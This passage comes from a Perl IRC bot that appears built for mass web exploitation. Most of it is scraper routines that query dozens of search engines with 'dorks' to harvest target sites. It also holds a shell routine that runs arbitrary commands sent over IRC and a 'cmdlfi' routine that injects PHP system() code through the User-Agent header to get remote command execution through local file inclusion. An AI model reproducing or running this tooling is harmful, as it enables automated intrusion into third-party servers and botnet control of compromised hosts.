        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);

		$b = "$i";

        my $res = &search_engine_query($search);

		if ($res !~ /firstres=$b\'>/) {$i=500;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {

            if ($1 !~ /rediff\.com/){

            my $link = $1;

				my @grep = &links($link);

				push(@list,@grep);

			}

        }

    }

    return @list;

}



sub uol() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=500; $i+=10) {

        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".&key($key)."&start=".$i);

        my $res = &search_engine_query($search);

		if ($res !~ m/<span class=\"next\">pr&#195;&#179;xima<\/span>/){$i=500;}

        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {

            if ($1 !~ /uol\.com/) {

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub bing() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=500; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$i."&FORM=PERE");

        my $res = &search_engine_query($search);

		if ($res =~ m/Ref A:/g && $res =~ m/Ref B:/g && $res =~ m/Ref C:/g) {$i=500;}

        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {

            if ($1 !~ /bing\.com/) {

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub altavista() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=500; $i+=10){

        my $search = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".&key($key)."&stq=".$i);

        my $res = &search_engine_query($search);

		if ($res !~ /target=\"_self\">Succ/) {$i=500;}

        while ($res =~ m/<span class=ngrn>(.+?)\//g) {

            if ($1 !~ /altavista/){

            my $link = $1;

                $link =~ s/<//g;

                $link =~ s/ //g;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub ask() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=50; $i+=1) {

        my $search = ("http://it.ask.com/web?q=".&key($key)."&qsrc=0&o=0&l=dir&qid=EE90DE6E8F5370F363A63EC61228D4FE&page=".$i."&jss=1&dm=all");

        my $res = &search_engine_query($search);

		if ($res !~ /Successiva/) {$i=50;}

        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=\"/g) {

            if ($1 !~ /ask\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub yahoo(){

    my @list;

	my $key = $_[0];

    my $b   = 0;

	for ($b=1; $b<=500; $b+=10) {

        my $search = ("http://search.yahoo.com/search?p=".&key($key)."&b=".$b);

        my $res = &search_engine_query($search);

        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {

            if ($1 !~ /yahoo\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub clusty() {

    my @list;

	my $key = $_[0];

    my $b   = 0;

	for ($b=10; $b<=500; $b+=10) {

        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");

        my $res = &search_engine_query($search);

		if ($res !~ /next/) {$b=500;}

        while ($res =~ m/<div class=\"document-header\"><a href=\"http:\/\/(.*?)\"><span class=\"title\">/g) {

            if ($1 !~ /yippy\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub gutser() {

    my @list;

    my $key = $_[0];

    for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://www.goodsearch.com/Search.aspx?Keywords=".&key($key)."&page=".$b."&osmax=0");

        my $res = &search_engine_query($search);

        while ($res =~ m/http:\/\/([^>\"]*)\">/g) {

            if ($1 !~ /goodsearch|good\.is|w3\.org|quantserve/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub google2() {

  my @list;

  my $key = $_[0];

  my $b	  = 0;

  my @doms = ("ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");

foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];

    for ($b=1; $b<=200; $b+=10) {

        my $search = ("http://www.google.".$dom."/search?num=50&q=".&key($key)."&start=".$b."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {

            if ($1 !~ /google/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    } return @list;

}

}



sub exalead() {

  my @list;

  my $key = $_[0];

    for ($b=0; $b<=1000; $b+=100) {

        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);

        my $res = &search_engine_query($search);

		if ($res =~ m/<span id=\"topNextUrl\">/g) {$b=1000;}

        while ($res =~ m/<a class=\"thumbnail\" href=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($link!~ /exalead/){

                my @grep = &links($link);

                push(@list,@grep);

            }

            }

        }

    return @list;	

}	



sub lycos() { 

  my @list;

  my $key = $_[0];

    for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://search.lycos.com/?query=".&key($key)."&page2=".$b."&tab=web&searchArea=web&diktfc=468007302EF7DB9AFE53D4138B848E7B4000D424385F");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.+?)\" onmouseover=/g) {

            if ($1 !~ /lycos\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;	

}	



sub virgilio() {

  my @list;

  my $key = $_[0];

    for ($b=10; $b<=500; $b+=10) {

        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".&key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);

        my $res = &search_engine_query($search);

		if ($res =~ m/non ha prodotto risultati/i) {$b=500;}

		if ($res =~ m/riconducibile a richieste effettuate/i) {$b=500;}

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" target=\"/g) {

            if ($1 !~ /\.virgilio\.it/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;	

}	



sub webde() {

  my @list;

  my $key = $_[0];

    for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".&key($key)."&search=Suche&webRb=countryDE");

        my $res = &search_engine_query($search);

		if ($res =~ m/Suchbegriff nicht gefunden/i) {$b=50;}

        while ($res =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g) {

            my $link = $1;

            if ($link!~ /suche|web/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;	

}	



sub hotbot() {

  my @list;

  my $key = $_[0];

    for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");

        my $res = &search_engine_query($search);

		if ($res =~ m/had no web result/i) {$b=50;}

        while ($res =~ m/rel=\"nofollow\" href=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /hotbot\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;	

}	



sub aol() {

  my @list;

  my $key = $_[0];

    for ($b=2; $b<=50; $b+=1) {

        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" property/g) {

            if ($1 !~ /aol\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;	

}



sub sapo(){

    my @list;

	my $key = $_[0];

	for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");

        my $res = &search_engine_query($search);

		if ($res !~ m/Next/i) {$b=50;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {

            if ($1 !~ /\.sapo\.pt/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub duck() {

	my @list;

	my $key = $_[0];

    my $b   = 0;

	for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://duckduckgo.com/html/?q=".&key($key)."&t=A&l=en&p=1&s=".$b."&o=json&dc=".$b."&api=d.js");

        my $res = &search_engine_query($search);

		if ($res =~ m/No more results/i) {$b=50;}

        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /duckduckgo/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub lygo() {

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=lygo&page2=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");

        my $res = &search_engine_query($search);

		if ($res =~ m/had no web result/i) {$b=50;}

        while ($res =~ m/<a href=\"http:\/\/(.+?)\"><img/g) {

            if ($1 !~ /hotbot\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub yause() {

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);

        my $res = &search_engine_query($search);

		if ($res !~ m/Next/i) {$b=50;}

        while ($res =~ m/<h1><a rel=\"nofollow\" href=\"http:\/\/(.+?)\" onfocus=/g) {

            if ($1 !~ /yauba\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub baidu() {

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=0; $b<=500; $b+=10) {

        my $search = ("http://www.baidu.com/s?wd=".&key($key)."&pn=".$b);

        my $res = &search_engine_query($search);

        while ($res =~ m/\" href=\"http:\/\/(.*?)\"  target=/g) {

            if ($1 !~ /baidu\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub kipot() {

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://www.qkport.com/".$b."/web/".&key($key));

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" target=\"_top\"/g) {

            if ($1 !~ /qkport\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub gibla() { #mati#

	my @list;

	my $key = $_[0];

	my $hal = "/search?q=".&key($key);

        my $search = ("http://www.gigablast.com".$hal);

        my $res = &search_engine_query($search);

	while ($res =~ m/Next 10 Results/) {

        $search = ("http://www.gigablast.com".$hal);

        while ($res =~ m/<span class=\"url\">(.+?)><\/span>/g) {

            my $link = $1;

            my @grep = &links($link);

            push(@list,@grep);

		} 

	if ($res =~ m/<center><a href=\"(.*?)\">/) { $hal = $1; }

	$res = &search_engine_query($search);

	}return @list;

}



sub black() {

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://blekko.com/ws/".&key($key)."?ft=&p=".$b);

		my $cek = $b+1;

        my $res = &search_engine_query($search);

		if ($res !~ m/<strong>$b<\/strong>/i) {$b=50;}

        while ($res =~ m/class=\"UrlTitleLine\" href=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /blekko/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub onet() { 

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".&key($key));

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /webcache|query/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub sizuka() {

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=10; $b<=100; $b+=10) {

        my $search = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&q=".&key($key)."&start=".$b);

        my $res = &search_engine_query($search);

        while ($res =~ m/<a title=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /szukacz/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub walla() { 

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://search.walla.co.il/?t=0&e=utf&q=".&key($key)."&p=".$b);

        my $res = &search_engine_query($search);

        while ($res =~ m/<td class=sw><a href=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /walla\.co\.il/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub demos() { 

	my @list;

	my $key = $_[0];

        my $b   = 0;

	for ($b=0; $b<=500; $b+=10) {

        my $search = ("http://search.dmoz.org/search/search?q=".&key($key)."&start=".$b."&type=next&all=yes");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /search|dmoz/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub rose() {

  my @list;

  my $key = $_[0];

  my $b	  = 0;

  my @langs = ("de","nl","fi","ps","da","en","es","fr","it","no","sv","cs","pl","ru");

foreach my $language (@langs) { $lang = $langs[rand(scalar(@langs))];

    for ($b=0; $b<=30; $b+=10) {

        my $search = ("http://euroseek.com/system/search.cgi?language=".$lang."&mode=internet&start=".$b."&string=".&key($key));

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" class=/g) {

            if ($1 !~ /euroseek/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

}return @list;

}



sub seznam() { 

	my @list;

	my $key = $_[0];

	for ($b=1; $b<=500; $b+=10) {

        my $search = ("http://search.seznam.cz/?q=".&key($key)."&count=10&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title/g) {

            if ($1 !~ /seznam/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub tiscali() { 

	my @list;

	my $key = $_[0];

	for ($b=0; $b<=500; $b+=10) {

        my $search = ("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".&key($key));

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onclick/g) {

            if ($1 !~ /tiscali/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub naver() { 

	my @list;

	my $key = $_[0];

	for ($b=1; $b<=500; $b+=10) {

        my $search = ("http://web.search.naver.com/search.naver?where=webkr&query=".&key($key)."&docid=0&#9001;=all&f=&srcharea=all&st=s&fd=2&start=".$b."&display=10");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {

            if ($1 !~ /naver/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}





#########################################

#########################################

#########################################

#########################################

#########################################

sub clean() {

    my @cln = ();

    my %visit = ();

    foreach my $element (@_) {

        $element =~ s/\/+/\//g;

        next if $visit{$element}++;

        push @cln, $element;

    }

    return @cln;

}



sub key() {

    my $dork = $_[0];

    $dork =~ s/ /\+/g;

    $dork =~ s/:/\%3A/g;

    $dork =~ s/\//\%2F/g;

    $dork =~ s/\?/\%3F/g;

    $dork =~ s/&/\%26/g;

    $dork =~ s/\"/\%22/g;

    $dork =~ s/,/\%2C/g;

    $dork =~ s/\\/\%5C/g;

	$dork =~ s/@/\%40/g;

	$dork =~ s/\[/\%5B/g;

	$dork =~ s/\]/\%5D/g;

	$dork =~ s/\?/\%3F/g;

	$dork =~ s/\=/\%3D/g;

	$dork =~ s/\|/\%7C/g;

    return $dork;

}



sub links() {

    my @list;

    my $link = $_[0];

    my $host = $_[0];

    my $hdir = $_[0];

    $hdir =~ s/(.*)\/[^\/]*$/$1/;

    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

    $host .= "/";

    $link .= "/";

    $hdir .= "/";

    $host =~ s/\/\//\//g;

    $hdir =~ s/\/\//\//g;

    $link =~ s/\/\//\//g;

    push(@list,$link,$host,$hdir);

    return @list;

}



sub search_engine_query($) {

    my $url = $_[0];

    $url =~ s/http:\/\///;

    my $host = $url;

    my $query = $url;

    my $page  = "";

    $host =~ s/href=\"?http:\/\///;

    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

    $query =~ s/$host//;

    if ($query eq "") { $query = "/"; }

        eval {

            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;

            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";

            my @pages = <$sock>;

            $page = "@pages";

            close($sock);

        };

    return $page;

}



#########################################



sub shell() {

    my $path = $_[0];

    my $cmd = $_[1];

    if ($cmd =~ /cd (.*)/) {

        chdir("$1") || &msg("$path"," 4,1No such file or directory");

        return;

    }

    elsif ($pid = fork) { waitpid($pid, 0); }

    else { if (fork) { exit; } else {

        my @output = `$cmd 2>&1 3>&1`;

        my $c = 0;

        foreach my $output (@output) {

            $c++;

            chop $output;

            &msg("$path","$output");

            if ($c == 5) { $c = 0; sleep 2; }

        }

        exit;

    }}

}



sub isAdmin() {

    my $status = 0;

    my $nick = $_[0];

    if ($nick eq $admin) { $status = 1; }

    return $status;

}



sub msg() {

    return unless $#_ == 1;

    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");

}



sub nick() {

    return unless $#_ == 0;

    sendraw("NICK $_[0]");

}



sub notice() {

    return unless $#_ == 1;

    sendraw("NOTICE $_[0] :$_[1]");

}



sub cmdlfi() {

my $browser = LWP::UserAgent->new;

my $url  = $_[0];

my $cmd  = $_[1];

my $chan = $_[2];

my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";

$browser->agent("$hie");

$browser->timeout(7);

$response = $browser->get( $url );

if ($response->content =~ /j13mbut(.*)j13mbut/s) {

&msg("$chan"," 15,1( 4@9CMDLFI 15) 9 $1 ");

} else {

&msg("$chan"," 15,1( 4@9CMDLFI 15) 4 No Output ");

}

}













